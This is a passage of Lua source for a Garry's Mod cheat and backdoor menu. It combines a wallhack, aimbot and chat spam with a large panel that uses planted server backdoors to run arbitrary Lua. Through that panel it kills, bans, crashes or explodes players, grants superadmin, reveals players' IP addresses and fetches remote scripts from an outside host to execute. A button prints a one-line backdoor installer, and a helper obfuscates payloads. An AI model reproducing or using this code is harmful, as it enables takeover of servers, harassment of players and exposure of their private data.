                    if enable['EntDistance'] then
                        if not enable['EntName'] then
                            local position = (ent:GetPos() + Vector(0,0,15)):ToScreen()
                            local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
                            draw.SimpleText(distance, "Default", position.x, position.y, color['Entity'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                        end
                    end

                    if enable['Ent3D'] then
                        local Position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                        local eyeangles = ent:EyeAngles()
                        local min, max = ent:WorldSpaceAABB()
                        local origin = ent:GetPos()
                        cam.Start3D()
                            render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, color['Entity'] )
                        cam.End3D()
                    end
                end
            end

            if ent:IsPlayer() and ent:Alive() and ent:Health() > 0 then
                if enable['Tracer'] then
                    surface.SetDrawColor(color['Tracer'])
                    surface.DrawLine(ScrW()/2, ScrH(), ent:GetPos():ToScreen().x, ent:GetPos():ToScreen().y)
                end

                if enable['Name'] and enable['Distance'] then
                    local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                    local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
                    draw.SimpleText(ent:Nick().." ["..distance.."]", "Default", position.x, position.y, color['NameDist'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                end

                if enable['Distance'] then
                    if not enable['Name'] then
                        local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                        local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
                        draw.SimpleText(distance, "Default", position.x, position.y, color['Distance'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                    end
                end

                if enable['Name'] then
                    if not enable['Distance'] then
                        local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                        draw.SimpleText(ent:Nick(), "Default", position.x, position.y, color['Name'], TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM)
                    end
                end

                if enable['Weapon'] then
                    if ent:GetActiveWeapon():IsValid() then
                        local weapon_name=ent:GetActiveWeapon():GetPrintName()
                        local Position = (ent:GetPos() + Vector(0,0,-15)):ToScreen()
                        draw.SimpleText(weapon_name, "Default", Position.x, Position.y, color['Weapon'], TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
                    end
                end

                if enable['Box2D'] then
                    local min, max = ent:GetCollisionBounds()
                    local pos = ent:GetPos()
                    local top, bottom = (pos + Vector(0, 0, max.z)):ToScreen(), (pos - Vector(0, 0, 8)):ToScreen()
                    local middle = bottom.y - top.y
                    local width = middle / 2.425
                    surface.SetDrawColor(color['Box2D'])
                    surface.DrawOutlinedRect(bottom.x - width, top.y, width * 1.85, middle)
                end

                if enable['Skeleton'] then
                    local Continue = true
                    local Bones = {}

                    for k, v in pairs(wtf.Bones) do
                        if ent:LookupBone(v) ~= nil and ent:GetBonePosition(ent:LookupBone(v)) ~= nil then
                            table.insert(Bones, ent:GetBonePosition(ent:LookupBone(v)):ToScreen())
                        else Continue=false; return end
                    end

                    if Continue then
                        surface.SetDrawColor(color['Skeleton'])
                        surface.DrawLine(Bones[1].x, Bones[1].y, Bones[2].x, Bones[2].y); surface.DrawLine(Bones[2].x, Bones[2].y, Bones[3].x, Bones[3].y)
                        surface.DrawLine(Bones[3].x, Bones[3].y, Bones[4].x, Bones[4].y); surface.DrawLine(Bones[4].x, Bones[4].y, Bones[5].x, Bones[5].y)
                        surface.DrawLine(Bones[5].x, Bones[5].y, Bones[6].x, Bones[6].y); surface.DrawLine(Bones[6].x, Bones[6].y, Bones[7].x, Bones[7].y)
                        surface.DrawLine(Bones[7].x, Bones[7].y, Bones[14].x, Bones[14].y); surface.DrawLine(Bones[14].x, Bones[14].y, Bones[15].x, Bones[15].y)
                        surface.DrawLine(Bones[15].x, Bones[15].y, Bones[16].x, Bones[16].y); surface.DrawLine(Bones[16].x, Bones[16].y, Bones[17].x, Bones[17].y)
                        surface.DrawLine(Bones[7].x, Bones[7].y, Bones[18].x, Bones[18].y); surface.DrawLine(Bones[18].x, Bones[18].y, Bones[19].x, Bones[19].y)
                        surface.DrawLine(Bones[19].x, Bones[19].y, Bones[20].x, Bones[20].y); surface.DrawLine(Bones[20].x, Bones[20].y, Bones[21].x, Bones[21].y)
                        surface.DrawLine(Bones[3].x, Bones[3].y, Bones[8].x, Bones[8].y); surface.DrawLine(Bones[8].x, Bones[8].y, Bones[9].x, Bones[9].y)
                        surface.DrawLine(Bones[9].x, Bones[9].y, Bones[10].x, Bones[10].y); surface.DrawLine(Bones[3].x, Bones[3].y, Bones[11].x, Bones[11].y)
                        surface.DrawLine(Bones[11].x, Bones[11].y, Bones[12].x, Bones[12].y); surface.DrawLine(Bones[12].x, Bones[12].y, Bones[13].x, Bones[13].y)
                    end
                end

                if enable['Box3D'] then
                    local position = (ent:GetPos() + Vector(0,0,80)):ToScreen()
                    local eyeangles = ent:EyeAngles()
                    local min, max = ent:WorldSpaceAABB()
                    local origin = ent:GetPos()

                    cam.Start3D()
                        render.DrawWireframeBox(origin, Angle(0, eyeangles.y, 0), min - origin, max - origin, color['Box3D'])
                    cam.End3D()
                end

                if enable['Wallhack'] then
                    cam.Start3D()
                        ent:DrawModel()
                    cam.End3D()
                end

                if enable['Chams'] then
                    local entitym = FindMetaTable("Entity")
                    local weapon = ent:GetActiveWeapon()

                    cam.Start3D()
                        cam.IgnoreZ(true)
                        entitym.DrawModel(ent)
                        cam.IgnoreZ(false)
                    cam.End3D()

                    if weapon:IsValid() then
                        cam.Start3D()
                            render.MaterialOverride(chams01)
                            render.SetColorModulation(color['Chams'].r/255, color['Chams'].g/255, color['Chams'].b/255, color['Chams'].a)
                            entitym.DrawModel(weapon)
                            render.SetColorModulation(color['Chams'].r/170, color['Chams'].g/170, color['Chams'].b/170, color['Chams'].a)
                            render.MaterialOverride(chams02)
                            entitym.DrawModel(weapon)
                        cam.End3D()

                        cam.Start3D()
                            render.MaterialOverride(chams01)
                            render.SetColorModulation(color['Chams'].r/255, color['Chams'].g/255, color['Chams'].b/255, color['Chams'].a)
                            entitym.DrawModel(ent)
                            render.SetColorModulation(color['Chams'].r/255, color['Chams'].g/255, color['Chams'].b/255, color['Chams'].a)
                            render.MaterialOverride(chams02)
                            entitym.DrawModel(ent)
                            render.SetColorModulation(1, 1, 1)
                        cam.End3D()
                    end
                end
            end
        end
    end
end)

local FovCircle = { 80 }
hook.Add("AltHUDPaint", FovHook, function()
    if enable['Aimbot'] then
        surface.DrawCircle(ScrW()/2, ScrH()/2, FovCircle[1], color['Fov'])
    end
end)

local function Valid(v)
    if(not v or  not v:IsValid() or v:Health() < 1 or v:IsDormant() or v == me) then return false; end
    return true
end

hook.Add("CreateMove", AimbotHook, function(cmd)
    if not enable['Aimbot'] then return end
    local ply = LocalPlayer()
    for k, v in pairs(player.GetAll()) do
        if Valid(v) then
            local plrpos = v:GetPos():ToScreen()
            if (plrpos.x >= ScrW()/2 - FovCircle[1] and plrpos.x <= ScrW()/2 + FovCircle[1]) and (plrpos.y >= ScrH()/2 - FovCircle[1] and plrpos.y <= ScrH()/2 + FovCircle[1]) then
                if (input.IsKeyDown(KEY_LALT)) then
                    local Target = v:LookupBone(wtf.Bones[1])
                    local TargetPos, TargetAngle = v:GetBonePosition(Target)
                    local Position = (TargetPos - ply:GetShootPos()):Angle()
                    cmd:SetViewAngles(Position)
                    if enable['AutoFire'] then
                        cmd:SetButtons(IN_ATTACK)
                    end
                end
            end
        end
    end
end)

local function AntiRecoil(ply, pos, angles, fov)
    local me, tps = LocalPlayer(), {}
    if enable['AntiRecoil'] then
        if not me:IsValid() and not me:Alive() and me:GetViewEntity() or me:InVehicle() then return end
        tps.angles = me:EyeAngles()
        return tps
    end
end

hook.Add("CalcView", AntiRecoilHook, AntiRecoil)

hook.Add("Think", PhyRainbowHook, function()
    if enable['PhysRainbow'] then
        local rainbow = HSVToColor((CurTime() * 12) % 360, 1, 1)
      	LocalPlayer():SetWeaponColor(Vector(rainbow.r / 255, rainbow.g / 255, rainbow.b / 255))
    end
end)

function wtf.bhop_loop(ply)
	if(ply:KeyDown(IN_JUMP) and not LocalPlayer():IsOnGround()) then
        ply:RemoveKey(IN_JUMP);
        if not LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() ~= MOVETYPE_NOCLIP then
            if(ply:GetMouseX() > 1 or ply:GetMouseX() < -1) then
                ply:SetSideMove(ply:GetMouseX() > 1 and 400 or -400);
            else
                ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D());
                ply:SetSideMove((ply:CommandNumber() % 2 == 0) and -400 or 400);
            end
        end
    elseif(ply:KeyDown(IN_JUMP)) then
        ply:SetForwardMove(10000)
    end
end

local ChatSpamDelay = 0
hook.Add("CreateMove", ChatSpamHook, function()
    if CurTime() < ChatSpamDelay then return end
    ChatSpamDelay = CurTime() + 0.05
    if enable['ChatSpam'] then
        if engine.ActiveGamemode() == 'darkrp' then
            LocalPlayer():ConCommand("say".." /ooc "..responses[math.random(1, table.Count(responses))])
        else
            LocalPlayer():ConCommand("say".." "..responses[math.random(1, table.Count(responses))])
        end
    end
end)

local IsKeyDown = false
hook.Add("Think", KeyHook, function()
    if input.IsKeyDown(KEY_INSERT) and not Menu:IsVisible() and not IsKeyDown then
        Menu:Show(); IsKeyDown=true
    elseif input.IsKeyDown(KEY_INSERT) and Menu:IsVisible() and not IsKeyDown then
       Menu:Hide(); IsKeyDown=true
    elseif not input.IsKeyDown(KEY_INSERT) then
        IsKeyDown=false
    end
end)

CreateCheckbox("Plr-Tracer", VisualsTab[1], 22, 10, function()
    enable['Tracer'] = not enable['Tracer']
    if enable['Tracer'] then
        wtf.Log("Tracer Enabled")
    else
        wtf.Log("Tracer Disabled")
    end
end)

CreateCheckbox("Plr-Distance", VisualsTab[1], 142, 10, function()
    enable['Distance'] = not enable['Distance']
    if enable['Distance'] then
        wtf.Log("Distance Enabled")
    else
        wtf.Log("Distance Disabled")
    end
end)

CreateCheckbox("Plr-Names", VisualsTab[1], 262, 10, function()
    enable['Name'] = not enable['Name']
    if enable['Name'] then
        wtf.Log("Names Enabled")
    else
        wtf.Log("Names Disabled")
    end
end)

CreateCheckbox("Plr-Weapons", VisualsTab[1], 382, 10, function()
    enable['Weapon'] = not enable['Weapon']
    if enable['Weapon'] then
        wtf.Log("Weapons Enabled")
    else
        wtf.Log("Weapons Disabled")
    end
end)

CreateCheckbox("Plr-2D-Box", VisualsTab[1], 22, 40, function()
    enable['Box2D'] = not enable['Box2D']
    if enable['Box2D'] then
        wtf.Log("2D Boxes Enabled")
    else
        wtf.Log("2D Boxes Disabled")
    end
end)

CreateCheckbox("Plr-3D-Box", VisualsTab[1], 142, 40, function()
    enable['Box3D'] = not enable['Box3D']
    if enable['Box3D'] then
        wtf.Log("3D Boxes Enabled")
    else
        wtf.Log("3D Boxes Disabled")
    end
end)

CreateCheckbox("Plr-Skeletons", VisualsTab[1], 262, 40, function()
    enable['Skeleton'] = not enable['Skeleton']
    if enable['Skeleton'] then
        wtf.Log("Skeletons Enabled")
    else
        wtf.Log("Skeletons Disabled")
    end
end)

CreateCheckbox("Plr-Chams", VisualsTab[1], 382, 40, function()
    enable['Chams'] = not enable['Chams']
    if enable['Chams']then
        wtf.Log("Chams Enabled")
    else
        wtf.Log("Chams Disabled")
    end
end)

CreateCheckbox("Ent-Names", VisualsTab[1], 22, 70, function()
    enable['EntName'] = not enable['EntName']
    if enable['EntName'] then
        wtf.Log("Ent Names Enabled")
    else
        wtf.Log("Ent Names Disabled")
    end
end)

CreateCheckbox("Ent-Distance", VisualsTab[1], 142, 70, function()
    enable['EntDistance'] = not enable['EntDistance']
    if enable['EntDistance'] then
        wtf.Log("Ent Distance Enabled")
    else
        wtf.Log("Ent Distance Disabled")
    end
end)

CreateCheckbox("Ent-3D", VisualsTab[1], 262, 70, function()
    enable['Ent3D'] = not enable['Ent3D']
    if enable['Ent3D'] then
        wtf.Log("Ent 3D Boxes Enabled")
    else
        wtf.Log("Ent 3D Boxes Disabled")
    end
end)

CreateCheckbox("Wallhack", VisualsTab[1], 382, 70, function()
    enable['Wallhack'] = not enable['Wallhack']
    if enable['Wallhack'] then
        wtf.Log("Wallhack Enabled")
    else
        wtf.Log("Wallhack Disabled")
    end
end)

CreateCheckbox("Free Camera", VisualsTab[1], 22, 100, function()
    FreeCamera['Enabled'] = not FreeCamera['Enabled']
    if FreeCamera['Enabled'] then
        FreeCamera['SetView'] = true
        wtf.Log("Freecam Enabled")
    else
        wtf.Log("Freecam Disabled")
    end
end)

local function SaveVisuals()
    local json = util.TableToJSON(color, true)
    file.Write("w0rst/visuals.txt", json)
    wtf.Log("Saved Visuals")
end

local function LoadVisuals()
    if file.Exists("w0rst/visuals.txt", "DATA") then
        local file = file.Read("w0rst/visuals.txt", "DATA")
        local json = util.JSONToTable(file)
        table.Merge(color, json)
        for i = 1, #ColorSliders do
            ColorSliders[i].Update()
        end; wtf.Log("Loaded Visuals")
    else
        wtf.Log("Unable To Load Visuals")
    end
end

CreateButton("Save Visuals", MiscTab[1], 110, 25, 395, 250, SaveVisuals)
CreateButton("Load Visuals", MiscTab[1], 110, 25, 280, 250, LoadVisuals)

CreateBDServer("wmenu-memento", function()
    wtf.Log("??? wgamefucker ???")
    http.Fetch('https://w0rst.xyz/script/extra/wgamefucker', function(b) wtf.SendLua(b) end)
end)

CreateBDServer("Kill All", function()
    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:Kill() v:Spawn() end")
    wtf.Log("Everyone Killed")
end)

CreateBDServer("Fling All", function()
    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(500,1000))) end")
    wtf.Log("Everyone Flung")
end)

CreateBDServer("Ignite All", function()
    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:Ignite(9999999,9999999) end")
    wtf.Log("Everyone Ignited")
end)

CreateBDServer("Extinguish All", function()
    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:Extinguish() end")
    wtf.Log("Everyone Extinguished")
end)

CreateBDServer("Ban All", function()
     wtf.Log("Everyone Banned")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:Ban(9999999999, false)
            v:Kick()
        end
    ]])
end)

CreateBDServer("Kick All", function()
     wtf.Log("Everyone Kicked")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:Kick()
        end
    ]])
end)

CreateBDServer("Retry All", function()
    wtf.Log("Everyone Retry'd")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:ConCommand('retry')
        end
    ]])
end)

CreateBDServer("Crash All", function()
    wtf.Log("Everyone Crashed")
    wtf.SendLua([[
        local id = Player(]]..LocalPlayer():UserID()..[[)
        for k,v in pairs(player.GetAll()) do
            if v:Nick() ~= id:Nick() then
                v:SendLua("function die() return die() end die()")
            end
        end
    ]])
end)

CreateBDServer("Teleport All",  function()
    wtf.Log("Everyone Teleported")
    wtf.SendLua([[
			for k,v in pairs(player.GetAll()) do
				local tps = v:GetEyeTraceNoCursor().HitPos
				v:SetPos(tps)
			end
        ]])
end)

CreateBDServer("Speed All", function()
    Derma_StringRequest("Set Speed All", "Set Everyones Speed To: ", "", function(str)
        wtf.Log("Speed Set: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:SetMaxSpeed(]]..str..[[)
                v:SetRunSpeed(]]..str..[[)
            end
        ]])
    end)
end)

CreateBDServer("Dance All",  function()
    wtf.Log("Everyone's Dancing")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
        end
    ]])
end)

CreateBDServer("Force Say All", function()
    Derma_StringRequest("Force Everyone To Chat", "Message To Chat:", "",function(str)
        wtf.Log("Everyone Just Said: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:Say("]]..str..[[")
            end
        ]])
    end)
end)

CreateBDServer("Encony fucker", function()
    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:addMoney(9999999999999) end")
    wtf.Log("Eco got raped cuh")
end)

CreateBDServer("Console Say", function()
    Derma_StringRequest("Console Say", "Make Console Say In Chat: ", "", function(str)
        wtf.Log("Console Said: "..str)
        wtf.SendLua([[RunConsoleCommand("say",']]..str..[[')]])
    end)
end)

CreateBDServer("Size All", function()
    Derma_StringRequest("Size Everyone", "Set The Size Of Everyone To:", "", function(str)
        wtf.Log("Everyones Size: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:SetModelScale(']]..str..[[')
            end
        ]])
    end)
end)

CreateBDServer("ConCommand All", function()
    Derma_StringRequest("ConCommand All", "Text To Run(eg: retry):", "", function(str)
        wtf.Log("Ran Command: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:ConCommand(']]..str..[[')
            end
        ]])
    end)
end)

CreateBDServer("JumpPower All", function()
    Derma_StringRequest("JumpPower All", "JumpPower To Set All:", "", function(str)
        wtf.Log("Everyones JumpPower: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:SetJumpPower(]]..str..[[)
            end
        ]])
    end)
end)

CreateBDServer("Break Glass", function()
  wtf.Log("Glass Breaking funninot ")
		wtf.SendLua([[
			for k,v in pairs(player.GetAll()) do
				v:EmitSound("physics/glass/glass_largesheet_break" .. math.random(1, 3) .. ".wav", 100, math.random(40, 180))
			end
		]])
	end)

CreateBDServer("God All", function()
    wtf.Log("Everyones God")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:GodEnable()
        end
    ]])
end)

CreateBDServer("UnGod All", function()
    wtf.Log("Everyones UnGoded")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:GodDisable()
        end
    ]])
end)

CreateBDServer("Stopsound All", function()
    wtf.Log("Stopped All Sound")
    wtf.SendLua([[
        for k,v in pairs(player.GetAll()) do
            v:ConCommand('stopsound')
        end
    ]])
end)

CreateBDServer("Moan All", function()
    wtf.Log("Everyone Moaned")
    wtf.SendLua([[
    for k,v in pairs(player.GetAll()) do
        v:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
    end
    ]])
end)

CreateBDServer("Blind All", function()
    wtf.Log("Everyone Blinded")
    wtf.SendLua([[BroadcastLua("hook.Add('HUDPaint','Blindness',function() surface.SetDrawColor(255,255,255,255) surface.DrawRect(0,0,1920,1080) end)")]])
end)

CreateBDServer("UnBlind All", function()
    wtf.Log("Everyone UnBlinded")
    wtf.SendLua([[BroadcastLua("hook.Remove('HUDPaint','Blindness')")]])
end)

CreateBDServer("Health All", function()
    Derma_StringRequest("Health All", "Health To Set To:", "", function(str)
        wtf.Log("Everyones Health Set: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:SetHealth(]]..str..[[)
            end
        ]])
    end)
end)

CreateBDServer("Armor All", function()
    Derma_StringRequest("Armor All", "Armor To Set To:", "", function(str)
        wtf.Log("Everyones Armor Set: "..str)
        wtf.SendLua([[
            for k,v in pairs(player.GetAll()) do
                v:SetArmor(]]..str..[[)
            end
        ]])
    end)
end)

CreateBDClient("Kill", function()
    wtf.Log("Killed: "..Player(SelectedPlr):Nick())
    wtf.SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:Kill()
        me:Spawn()
    ]])
end)

CreateBDClient("Fling", function()
    wtf.Log("Flung: "..Player(SelectedPlr):Nick())
    wtf.SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(50,1000)))
    ]])
end)

CreateBDClient("Set Speed",  function()
    Derma_StringRequest("Set Speed", "Speed To Set The Player:", "", function(str)
        wtf.Log(Player(SelectedPlr):Nick().." Speed Set")
        wtf.SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:SetMaxSpeed(]]..str..[[)
            me:SetRunSpeed(]]..str..[[)
        ]])
    end)
end)

CreateBDClient("Give Item",  function()
    Derma_StringRequest("Give Item", "Give Item Named:", "", function(str)
        wtf.Log("Item Given To: "..Player(SelectedPlr):Nick())
        wtf.SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:Give(']]..str..[[')
        ]])
    end)
end)

CreateBDClient("Crash Player",  function()
    wtf.SendLua([[
        Player(]]..SelectedPlr..[[):SendLua("function die() return die() end die()")
    ]])
    wtf.Log("Player: "..Player(SelectedPlr):Nick().." Crashed")
end)

CreateBDClient("Force Say",  function()
    Derma_StringRequest("Force Say", "Force Player To Say:", "", function(str)
        wtf.SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:Say("]]..str..[[")
        ]])
        wtf.Log("Player: "..Player(SelectedPlr):Nick().." Said "..str)
    end)
end)

CreateBDClient("NoClip Player",  function()
    wtf.SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        if me:GetMoveType() ~= MOVETYPE_NOCLIP then
            me:SetMoveType(MOVETYPE_NOCLIP)
        else
            me:SetMoveType(MOVETYPE_WALK)
        end
    ]])

    if Player(SelectedPlr):GetMoveType() == MOVETYPE_NOCLIP then
        wtf.Log("Noclip Off")
    else
        wtf.Log("Noclip On")
    end
end)

CreateBDClient("Set Usergroup",  function()
    Derma_StringRequest("Set Usergroup", "ex: superadmin", "", function(str)
        wtf.Log("Player: "..Player(SelectedPlr):Nick().." Usergroup: "..str)
        wtf.SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:SetUserGroup("]]..str..[[")
        ]])
    end)
end)

CreateBDClient("God Enable",  function()
    wtf.Log("Player: "..Player(SelectedPlr):Nick().." Godded")
    wtf.SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:GodEnable()
    ]])
end)

CreateBDClient("God Disable",  function()
    wtf.Log("Player: "..Player(SelectedPlr):Nick().." UnGodded")
    wtf.SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:GodDisable()
    ]])
end)

CreateBDClient("Ban Player",  function()
    wtf.Log("Player"..Player(SelectedPlr):Nick().." Banned")
    wtf.SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:Ban(999999999,false)
        me:Kick()
    ]])
end)

CreateBDClient("Kick Player",  function()
    wtf.Log("Player "..Player(SelectedPlr):Nick().." Kicked")
    wtf.SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:Kick()
    ]])
end)

CreateBDClient("Retry Player",  function()
    wtf.Log("Player "..Player(SelectedPlr):Nick().." Retry'd")
    wtf.SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:ConCommand('retry')
    ]])
end)

CreateBDClient("Print Ip",  function()
    wtf.Log("Players IPs Logged")
    wtf.SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        local ply = ]]..LocalPlayer():UserID()..[[
        Player(ply):ChatPrint("Player: " .. me:Nick() .. " (" .. me:SteamID() .. ") IP: " .. me:IPAddress())
    ]])
end)

CreateBDClient("Dance Player",  function()
    wtf.Log("Players: "..Player(SelectedPlr):Nick().." Dancing")
    wtf.SendLua([[
        local me = Player(]]..SelectedPlr..[[)
        me:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
    ]])
end)

CreateBDClient("Size Player",  function()
    Derma_StringRequest("Set Size", "Players Size:", "", function(str)
        wtf.Log("Player: "..Player(SelectedPlr):Nick().." Size:"..str)
        wtf.SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:SetModelScale(']]..SelectedPlr..[[')
        ]])
    end)
end)

CreateBDClient("ConCommand Player",  function()
    Derma_StringRequest("ConCommand", "String To Run In Console:", "", function(str)
        wtf.Log("Ran Command: "..str.." Player: "..Player(SelectedPlr):Nick())
        wtf.SendLua([[
            local me = Player(]]..SelectedPlr..[[)
            me:ConCommand(']]..str..[[')
        ]])
    end)
end)

CreateBDClient("IP Say",  function()
    wtf.Log("They Said There Ip")
    wtf.SendLua([[
  			local me = Player(]].. SelectedPlr..[[)
  			me:Say("My IP Is: "..me:IPAddress())
    ]])
end)

CreateBDClient("Drop Weapon",  function()
    wtf.Log("They Dropped Their Weapon")
    wtf.SendLua([[
        local me = Player(]].. SelectedPlr..[[)
        if me:GetActiveWeapon() ~= nil then
            me:DropWeapon(me:GetActiveWeapon())
        end
    ]])
end)

CreateBDClient("Explode Player", function()
    wtf.Log("Exploded "..Player( SelectedPlr):Nick())
    wtf.SendLua([[
        local explo = ents.Create("env_explosion")
        local me = Player(]].. SelectedPlr..[[)

            explo:SetOwner(me)
            explo:SetPos(me:GetPos())
            explo:SetKeyValue("iMagnitude", "250")
            explo:Spawn()
            explo:Activate()
            explo:Fire("Explode", "", 0)

        if me:Alive() then
            me:Kill()
        end
    ]])
end)

CreateButton("Net-Scan", BackdoorTab[1], 115, 30, 19, 520, function()
    wtf.CheckWebNets()
end)

CreateButton("Select-Net", BackdoorTab[1], 115, 30, 139, 520, function()
    Derma_StringRequest("Select Net", "Net To Select:", "", function(str)
        if wtf.CheckNet(str) then
            SelectedNet=str
            wtf.Log("Selected Net "..str)
            wtf.conoutRGB("NET SELECTED: "..str)
        else
            wtf.Log("Invalid Net")
            wtf.conoutRGB("NET INVALID")
        end
    end)
end)

CreateButton("Add-Net", BackdoorTab[1], 115, 30, 259, 520, function()
    Derma_StringRequest("Add Net | Staff Use Only", "Net To Add:", "", function(str)
        wtf.AddNet(str)
    end)
end)

CreateButton("Run Lua", BackdoorTab[1], 115, 30, 379, 520, function()
    if(SelectedNet ~= "NONE") then
        _G.net.Start(SelectedNet)
        _G.net.WriteString(LuaEditor:GetValue())
        _G.net.WriteBit(false)
        _G.net.SendToServer(); wtf.Log("Ran Lua - Server")
    else
        wtf.Log("No Net Selected")
    end
end)

CreateCheckbox("Adv-Bhop", MiscTab[1], 20, 10, function()
    enable['Bhop'] = not enable['Bhop']
    if enable['Bhop'] then
        wtf.Log("Bhop Enabled")
        hook.Add("CreateMove", BhopHook, function(ply) wtf.bhop_loop(ply) end);
    else
        wtf.Log("Bhop Disabled")
        hook.Remove("CreateMove", BhopHook)
    end
end)

CreateButton("Net-Dumper", MiscTab[1], 110, 25, 140, 10, function()
    local name = "w0rst/netstrings".."_"..math.random(10^5,10^10)..".txt"
    if file.Exists(name, "DATA") then
        file.Delete(name)
    end

    for i=1,10000 do
        if util.NetworkIDToString(i) then
            if file.Exists(name, "DATA") then
                file.Append(name, "\n"..util.NetworkIDToString(i).." - "..i)
            else
                file.Write(name, GetHostName()..[[ - ]]..game.GetIPAddress().."\n"..util.NetworkIDToString(i).." - "..i)
            end
        end
    end

    wtf.Log("Check Console")
    wtf.conoutRGB("NET DUMP LOCATION: GarrysMod\\garrysmod\\data\\"..name)
end)

CreateButton("W0RST-BD | Method", MiscTab[1], 110, 25, 260, 10, function()
    MsgC("timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm', RunString) end)\n")
    wtf.Log("Check Console")
end)

CreateButton("Rainbow-Physgun", MiscTab[1], 110, 25, 380, 10, function()
    enable['PhysRainbow'] = not enable['PhysRainbow']
    if enable['PhysRainbow'] then
        wtf.Log("RGB-Physgun Enabled")
    else
        wtf.Log("RGB-Physgun Disabled")
    end
end)

CreateCheckbox("Use-Spammer", MiscTab[1], 20, 40, function()
    enable['UseSpam'] = not enable['UseSpam']
    if enable['UseSpam'] then
        wtf.Log("Use Spammer Enabled")
        hook.Add("Tick", UseSpamHook, function()
            timer.Simple(0.05, function() RunConsoleCommand("+use") end)
            timer.Simple(0.10, function() RunConsoleCommand("-use") end)
        end)
    else
        wtf.Log("Use Spammer Disabled")
        hook.Remove("Tick", UseSpamHook)
    end
end)

CreateCheckbox("Flash-Spammer", MiscTab[1], 140, 40, function()
    enable['FlashSpam'] = not enable['FlashSpam']
    if enable['FlashSpam'] then
        wtf.Log("Flash Spammer Enabled")
        hook.Add("Tick", FlashSpamHook , function()
            LocalPlayer():ConCommand("impulse 100")
        end)
    else
        wtf.Log("Flash Spammer Disabled")
        hook.Remove("Tick", FlashSpamHook )
    end
end)

CreateButton("FOV-Editor", MiscTab[1], 110, 25, 260, 40, function()
    Derma_StringRequest("Edit Fov", "Set Fov To:", "", function(str)
        LocalPlayer():ConCommand("fov_desired "..str)
        wtf.Log("FOV Set: "..str)
    end)
end)

CreateButton("Encode-String", MiscTab[1], 110, 25, 380, 40, function()
    Derma_StringRequest("Encode String", "String To Encode", "", function(str)
        local encoded = str:gsub(".", function(bb) return "\\" .. bb:byte() end)
        wtf.conoutRGB("ENCODED-STRING: ".."RunString('"..encoded.."')")
        SetClipboardText("RunString('"..encoded.."')")
        wtf.Log("Check Console")
      end)
end)

CreateCheckbox("Chat Advertise", MiscTab[1], 20, 70, function()
    enable['ChatSpam'] = not enable['ChatSpam']
    if enable['ChatSpam'] then
        wtf.Log("Chat Advertiser Enabled")
    else
        wtf.Log("Chat Advertiser Disabled")
    end
end)

CreateSlider("Fov:", FovCircle, MiscTab[1], 1000, 5, 260, 70)
CreateCheckbox("Fov Aimbot", MiscTab[1], 140, 70, function()
    enable['Aimbot'] = not enable['Aimbot']
    if enable['Aimbot'] then
        wtf.Log("Aimbot Enabled")
    else
        wtf.Log("Aimbot Disabled")
    end
end)

CreateCheckbox("Auto Fire", MiscTab[1], 20, 100, function()
    enable['AutoFire'] = not enable['AutoFire']
    if enable['AutoFire'] then
        wtf.Log("Aimbot AutoFire Enabled")
    else
        wtf.Log("Aimbot AutoFire Disabled")
    end
end)

CreateCheckbox("AntiRecoil", MiscTab[1], 380, 70, function()
    enable['AntiRecoil'] = not enable['AntiRecoil']
    if enable['AntiRecoil'] then
        wtf.Log("AntiRecoil Enabled")
    else
        wtf.Log("AntiRecoil Disabled")
    end
end)

